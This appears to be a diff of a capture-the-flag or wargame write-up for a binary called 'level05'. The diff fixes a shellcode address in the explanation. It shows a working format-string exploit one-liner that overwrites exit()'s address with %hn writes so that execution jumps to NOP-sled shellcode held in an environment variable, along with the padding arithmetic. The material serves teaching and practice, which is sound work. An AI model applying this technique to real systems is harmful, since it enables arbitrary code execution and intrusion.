@@ -43,7 +43,7 @@ and then
 (python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55414d" + "%10$hn" + "%10113d" + "%11$hn")'; cat) | ./level05
 ```
 
-The address of the environment variable storing our shellcode is 0xffffd8d6, we will add 12 (0xffffd87e) to be sure this address correspond to a NOP instruction, which gives us, in decimal:
+The address of the environment variable storing our shellcode is 0xffffd872, we will add 12 (0xffffd87e) to be sure this address correspond to a NOP instruction, which gives us, in decimal:
 ffff = 65535 / d87e = 55422
 Since we're in little endian, we start with `d87e`, minus 8 (because of the 8 bytes of the address of `exit()`): 55414.
 Then, for `ffff` minus 8 and minus 55414, so we get: 10113.
